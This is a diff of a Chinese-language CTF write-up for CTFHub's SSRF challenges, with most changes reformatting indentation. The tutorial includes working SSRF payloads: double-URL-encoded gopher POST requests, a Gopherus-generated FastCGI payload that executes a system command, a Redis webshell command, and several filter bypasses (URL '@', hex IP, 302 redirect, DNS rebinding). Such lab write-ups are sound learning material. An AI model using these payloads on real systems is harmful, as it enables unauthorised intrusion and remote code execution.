@@ -15,76 +15,76 @@ tag:
   - ctfhub
   - ssrf
 
-meta:
-
-
-
 comment: false
+typora-root-url: ..\..\..\.vuepress\public
 ---
+
 ## SSRF
   ![ssrf](/assets/img/ctf/ssrf.png)
-  ### 内网访问
-    直接构造访问请求,获取flag
-    ```url
-    /?url=127.0.0.1/flag.php
-    ```
-  ### 伪协议读取文件
-    根据题目提示使用file://协议，尝试一般web目录/var/www/html/  
-    ![file](/assets/img/ctf/file.png)
-  ### 端口扫描
-    提示端口范围8000到9000
-    ```url
-    /?url=127.0.0.1:8000
-    ```
-    使用burpsuite对端口进行爆破，即可得到端口，访问获取flag
-  ### POST请求  
-    访问/?url=127.0.0.1/flag.ph,返回页面  
-    ![post1](/assets/img/ctf/post1.png)  
-    包含一个form和隐藏的key，推测需要在form中提交key，F12添加提交按钮  
-    ```
-    <input type="submit" name="sbumit">
-    ```   
-    ![post3](/assets/img/ctf/post3.png)  
-    在页面上提交key，页面返回"Just View From 127.0.0.1"  
-    ![post5](/assets/img/ctf/post5.png)  
-    可见需要通过SSRF提交请求，构造POST请求
-    ```
-  POST /flag.php HTTP/1.1
-  Host: 127.0.0.1:80
-  Content-Type: application/x-www-form-urlencoded
-  Content-Length: 36
+### 内网访问
+  直接构造访问请求,获取flag
+  ```
+  /?url=127.0.0.1/flag.php
+  ```
+### 伪协议读取文件
+  根据题目提示使用file://协议，尝试一般web目录/var/www/html/  
+  ![file](/assets/img/ctf/file.png)
+### 端口扫描
+  提示端口范围8000到9000
+  ```url
+  /?url=127.0.0.1:8000
+  ```
+  使用burpsuite对端口进行爆破，即可得到端口，访问获取flag
+### POST请求  
+  访问/?url=127.0.0.1/flag.ph,返回页面  
+  ![post1](/assets/img/ctf/post1.png)  
+  包含一个form和隐藏的key，推测需要在form中提交key，F12添加提交按钮  
 
-  key=99cb8729f8a7ba5dcaa367dc092c2f2c
-    ```
-    因为通过SSRF，需要进行两次请求，所以对请求数据进行2次url编码，注意使用CRLF，第一次url编码后需要将%0A替换为%0D%0A,最后得到请求数据  
-    ```
-    POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D99cb8729f8a7ba5dcaa367dc092c2f2c
-    ```
-    使用gopher发送请求，gopher协议是SSRF中常用的一个协议：
-    ```url
-    gopher://IP:port/_{TCP/IP数据流}
-    ```
-    得到flag   
-    ![post4](/assets/img/ctf/post4.png)
-  ### 文件上传
+  ```
+  <input type="submit" name="sbumit">
+  ```
+  ![post3](/assets/img/ctf/post3.png)  
+  在页面上提交key，页面返回"Just View From 127.0.0.1"  
+  ![post5](/assets/img/ctf/post5.png)  
+  可见需要通过SSRF提交请求，构造POST请求
+  ```
+    POST /flag.php HTTP/1.1
+    Host: 127.0.0.1:80
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 36
+
+    key=99cb8729f8a7ba5dcaa367dc092c2f2c
+  ```
+  因为通过SSRF，需要进行两次请求，所以对请求数据进行2次url编码，注意使用CRLF，第一次url编码后需要将%0A替换为%0D%0A,最后得到请求数据  
+  ```
+​    POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D99cb8729f8a7ba5dcaa367dc092c2f2c
+  ```
+  使用gopher发送请求，gopher协议是SSRF中常用的一个协议：
+  ```url
+  gopher://IP:port/_{TCP/IP数据流}
+  ```
+​    得到flag   
+​    ![post4](/assets/img/ctf/post4.png)
+
+### 文件上传
   使用file协议查看flag.php，代码检查了上传ip和文件大小，所以需要从127.0.0.1上传非空文件
-    ```php html
-    <?php
-    error_reporting(0);
-    if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
-        echo "Just View From 127.0.0.1";
-        return;
-    }
-    if(isset($_FILES["file"]) && $_FILES["file"]["size"] > 0){
-        echo getenv("CTFHUB");
-        exit;
-    }
-    ?>
-    Upload Webshell
-    <form action="/flag.php" method="post" enctype="multipart/form-data">
-        <input type="file" name="file">
-    </form>
-    ```
+  ```php html
+  <?php
+  error_reporting(0);
+  if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
+      echo "Just View From 127.0.0.1";
+      return;
+  }
+  if(isset($_FILES["file"]) && $_FILES["file"]["size"] > 0){
+      echo getenv("CTFHUB");
+      exit;
+  }
+  ?>
+  Upload Webshell
+  <form action="/flag.php" method="post" enctype="multipart/form-data">
+      <input type="file" name="file">
+  </form>
+  ```
 
   访问`/?url=127.0.0.1/flag.php`，返回一个文件上传form，根据题意需要提交文件获取flag，F12添加提交按钮  
   ![upload1](/assets/img/ctf/upload1.png)  
@@ -97,7 +97,7 @@ comment: false
   ```
   使用gopher发送请求，得到flag  
   ![upload3](/assets/img/ctf/upload3.png)
-  ### FastCGI协议
+### FastCGI协议
   [fastcgi相关介绍](https://blog.csdn.net/mysteryflower/article/details/94386461)  
   [gopher payload工具](https://github.com/tarunkant/Gopherus)  
   使用gopherus工具生成payload，运行命令`ls /`  
@@ -113,11 +113,11 @@ comment: false
   进行url编码后得到提交payload    
   ```url
   gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_14e0ba551d369f7992793e0b62395dc5%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
-  ```  
+  ```
   发送请求，获得flag  
   ![fastcgi4](/assets/img/ctf/fastcgi4.png)
 
-  ### Redis协议
+### Redis协议
   [浅析Redis中SSRF的利用](https://xz.aliyun.com/t/5665)  
   redis写shell命令如下
   ```shell
@@ -137,28 +137,28 @@ comment: false
   ![redis2](/assets/img/ctf/redis2.png)  
   获取flag文件，再构造请求`/shell.php?cmd=cat%20/flag_1d41ab57dcc1507d5d99e103cdca52da`,获得flag  
   ![redis3](/assets/img/ctf/redis3.png)  
-  ### URL Bypasss
-    访问地址提示"start with `http://notfound.ctfhub.com`", 所以需要以`http://notfound.ctfhub.com`开头，构造访问url如下获取flag
-    ```url
-    /?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
-    ```
-  ### 数字IP Bypass
+### URL Bypasss
+  访问地址提示"start with `http://notfound.ctfhub.com`", 所以需要以`http://notfound.ctfhub.com`开头，构造访问url如下获取flag
+  ```url
+  /?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
+  ```
+### 数字IP Bypass
   题目提示ban掉了127以及172.不能使用点分十进制的IP，但是又要访问127.0.0.1
-    - 方法一：  
-    使用localhost代替127.0.0.1,构造请求url如下，获取flag
-    ```url
-    /?url=http://localhost/flag.php
-    ```
-    - 方法二:  
-    将127.0.0.1转换为16进制0x7F000001,构造请求url如下，获取flag
-    ```url
-    /?url=http://0x7F000001/flag.php
-    ```  
+  - 方法一：  
+  使用localhost代替127.0.0.1,构造请求url如下，获取flag
+  ```url
+  /?url=http://localhost/flag.php
+  ```
+  - 方法二:  
+  将127.0.0.1转换为16进制0x7F000001,构造请求url如下，获取flag
+  ```url
+  /?url=http://0x7F000001/flag.php
+  ```  
 
-  ### 302跳转 Bypass
+### 302跳转 Bypass
   题目提示过滤了127.0.0.1，使用[数字IP Bypass](#数字ip-bypass)可以绕过，但是题意是使用302跳转绕过，可以生成短链接302跳转获得flag,  [短链接生成网站](https://my5353.com/)  
   ![短链接访问](/assets/img/ctf/302.png)
-  ### DNS重绑定
+### DNS重绑定
   [DNS重绑定漏洞](https://zhuanlan.zhihu.com/p/89426041)  
   使用file://协议查看flag.php查看代码发现过滤了`/127|172|10|192/`开头，可以用16进制方式绕过，但是考虑到题目要求使用DNS重绑定  
   使用[rbndr.us dns rebinding service](https://lock.cmpxchg8b.com/rebinder.html)获取域名  
